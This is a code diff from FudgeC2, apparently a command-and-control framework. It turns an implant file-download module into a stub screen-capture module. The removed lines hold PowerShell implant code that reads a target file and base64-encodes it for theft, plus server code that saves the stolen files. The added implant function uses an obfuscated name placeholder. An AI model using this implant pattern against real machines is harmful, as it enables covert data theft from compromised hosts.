@@ -3,10 +3,10 @@ import base64
 
 from FudgeC2.Storage.settings import Settings
 
-class DownloadFile:
-    type = "FD"
+class ScreenCapture:
+    type = "SC"
     args = "base64 target file"
-    input = "download_file"
+    input = "screenshot"
 
     def process_implant_response(self, data, filepath):
         """print("sub class")
@@ -24,19 +24,21 @@ class DownloadFile:
           Check for filename uniqueness.
         """
 
-        filename = secrets.token_hex(3)
-        download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}"
-        with open(download_file_path, 'wb') as file_h:
+        # filename = secrets.token_hex(3)
+        # download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}"
+        # with open(download_file_path, 'wb') as file_h:
+        #
+        #     file_h.write(base64.b64decode(data))
+        # return f"File downloaded: {filepath}\nFile saved to {download_file_path}", None
 
-            file_h.write(base64.b64decode(data))
-        return f"File downloaded: {filepath}\nFile saved to {download_file_path}", None
+        return "Screen capture: In dev.", None
 
     def implant_text(self):
         var = '''
-function {{ ron.obf_download_file }} ($b){
+function {{ ron.obf_screen_capture }} ($b){
     try {
-        $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($b))
-        $Script:tr = $base64string
+    # Capture screen to occur here: 
+        $Script:tr = "1"
     } catch {
         Script:tr = "0"
     }
